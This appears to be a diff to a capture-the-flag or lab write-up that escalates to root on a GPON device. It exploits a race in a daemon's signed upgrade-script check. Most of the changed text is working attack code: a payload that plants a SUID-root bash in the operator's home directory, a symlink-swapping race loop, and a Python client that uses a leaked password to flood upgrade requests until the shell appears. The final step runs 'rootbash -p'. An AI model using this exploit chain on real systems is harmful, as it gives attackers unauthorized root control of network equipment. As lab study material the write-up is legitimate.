@@ -348,12 +348,16 @@ Copy the legitimate signed template to `/tmp`:
 cp /opt/gpon/upgrade_templates/upgrade_ok.sh /tmp/upgrade.sh
 ```
 
-Create a malicious payload script (e.g., a reverse shell or adding our SSH key to root):
+Create a malicious payload script that drops a SUID-root bash into the user's home directory.
+
+Note: `/tmp` is mounted with `nosuid` on this box, so a SUID binary placed under `/tmp` would not grant privileges.
 
 ```bash
 cat > /tmp/evil.sh << 'PAYLOAD'
 #!/bin/bash
-cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+cp /bin/bash /home/gpon-operator/rootbash
+chown root:root /home/gpon-operator/rootbash
+chmod 4755 /home/gpon-operator/rootbash
 PAYLOAD
 chmod +x /tmp/evil.sh
 ```
@@ -384,9 +388,10 @@ while true; do
   mv -f "$STAGE_EVIL" "$LINK"   # execution should hit this (rare)
   mv -f "$STAGE_GOOD2" "$LINK"  # immediately restore GOOD
 
-  # Check if SUID bash was created
-  if [ -f /tmp/rootbash ] && [ -u /tmp/rootbash ]; then
-    echo "[+] SUID bash created!"
+  # Check if the SUID shell was created
+  if [ -f /home/gpon-operator/rootbash ] && [ -u /home/gpon-operator/rootbash ]; then
+    echo "[+] SUID rootbash created at /home/gpon-operator/rootbash"
+    echo "[+] Root shell: /home/gpon-operator/rootbash -p"
     exit 0
   fi
 done
@@ -416,7 +421,7 @@ Alternatively, if `make` is not available or we prefer Python, write a minimal c
 
 ```python
 #!/usr/bin/env python3
-import socket, struct, hashlib
+import socket, struct, hashlib, os, time
 
 MAGIC = 0x474F4E43
 
@@ -448,7 +453,9 @@ PORT = 8472
 USERNAME = b'gpon-operator'
 PASSWORD = b'<PASTE_LEAKED_PASSWORD_HERE>'
 UPGRADE_PATH = b'/tmp/upgrade.sh\x00'
+ROOTBASH = '/home/gpon-operator/rootbash'
 
+print('[*] Starting OMCI client...')
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
@@ -470,8 +477,18 @@ print(f'AUTH response: {resp}')
 for i in range(10000):
     s.sendall(build_packet(0x05, 3 + i, UPGRADE_PATH))
     _, _, _, resp = recv_packet(s)
-    if b"scheduled" in resp.lower():
-        pass
+    if i % 1000 == 0 and i != 0:
+        print(f'[*] Attempts: {i}/10000')
+    # Periodically check whether the race already succeeded.
+    if i % 200 == 0:
+        try:
+            st = os.stat(ROOTBASH)
+            if (st.st_mode & 0o4000) != 0:
+                print('[+] SUID rootbash detected. Root shell: /home/gpon-operator/rootbash -p')
+                break
+        except FileNotFoundError:
+            pass
+    time.sleep(0.001)
 s.close()
 ```
 
@@ -495,22 +512,14 @@ The timing works as follows:
 2. The OMCI client sends UPGRADE_ONU pointing to `/tmp/upgrade.sh`.
 3. The daemon validates the signed script (passes HMAC check).
 4. During the 25 ms sleep, the race loop may have pulsed the path to the evil script.
-5. The daemon executes the now-replaced file as root.
+5. The daemon executes the now-replaced file as root, creating a SUID bash at `/home/gpon-operator/rootbash`.
 
-After a successful race (may take a few attempts):
-
-```bash
-ls -la /tmp/rootbash
-```
-
-```
--rwsr-sr-x 1 root root 1396520 ... /tmp/rootbash
-```
+After a successful race (may take a few attempts), the race script prints `[+] SUID rootbash created...` and exits.
 
 ### Get Root
 
 ```bash
-/tmp/rootbash -p
+/home/gpon-operator/rootbash -p
 whoami
 ```
 
